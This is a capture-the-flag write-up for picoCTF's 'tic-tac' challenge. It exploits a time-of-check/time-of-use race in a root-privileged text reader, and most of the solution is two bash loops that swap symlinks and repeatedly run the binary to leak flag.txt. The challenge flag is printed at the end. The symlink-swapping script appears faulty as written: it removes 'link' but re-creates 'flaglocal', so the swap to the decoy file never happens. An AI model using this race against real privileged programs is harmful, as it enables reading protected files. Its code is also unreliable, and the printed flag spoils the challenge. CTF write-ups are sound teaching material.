# tic-tac

## Challenge

### Description

Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.

`ssh` to `saturn.picoctf.net:50933`, and run the binary named "txtreader" once connected. Login as `ctf-player` with the password.

### Hints

(None)

## Solution

The program `txtreader` is compiled from [this source file](./src.cpp), which has a TOCTOU vulnerability.

Exploit scripts:

- redirect.sh

```sh
#!/bin/bash
# redirect.sh

while true
do
    rm flaglocal
    ln -s flag.txt flaglocal
    rm link
    ln -s fake.txt flaglocal
done
```

- exploit.sh

```sh
#!/bin/bash
# exploit.sh

while true; do
    ./txtreader flaglocal 2> /dev/null
done
```

And run them as follow

```console
$ touch fake.txt
$ ./redirect.sh &
$ exploit.sh
```

Wait a while, and we get the flag. How long we have to wait depends entirely on luck.

## Flag

picoCTF{ToctoU_!s_3a5y_5748402c}
